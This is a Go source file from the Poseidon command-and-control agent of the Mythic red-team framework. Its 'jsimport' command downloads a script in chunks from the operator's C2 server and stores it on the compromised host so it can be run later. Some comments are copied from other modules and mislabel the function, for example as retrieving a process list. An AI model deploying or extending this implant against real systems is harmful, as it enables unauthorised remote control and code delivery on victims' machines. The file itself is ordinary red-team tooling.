package jsimport

import (
	// Standard
	"encoding/json"
	"fmt"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// initial .m code pulled from https://github.com/its-a-feature/macos_execute_from_memory
// and https://github.com/opensource-apple/dyld/tree/master/unit-tests/test-cases/bundle-memory-load

type jsimportArgs struct {
	FileID string `json:"file_id"`
}

// Run - interface method that retrieves a process list
func Run(task structs.Task) {
	msg := task.NewResponse()

	args := jsimportArgs{}

	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}
	r := structs.GetFileFromMythicStruct{}
	r.FileID = args.FileID
	r.FullPath = ""
	r.Task = &task
	r.ReceivedChunkChannel = make(chan []byte)
	task.Job.GetFileFromMythic <- r

	fileBytes := make([]byte, 0)

	for {
		newBytes := <-r.ReceivedChunkChannel
		if len(newBytes) == 0 {
			break
		} else {
			fileBytes = append(fileBytes, newBytes...)
		}
	}
	if len(fileBytes) == 0 {
		msg.SetError(fmt.Sprintf("Failed to get file"))
		task.Job.SendResponses <- msg
		return
	}
	task.Job.SaveFileFunc(args.FileID, fileBytes)
	msg.Completed = true
	msg.UserOutput = "Imported script"
	task.Job.SendResponses <- msg
	return
}
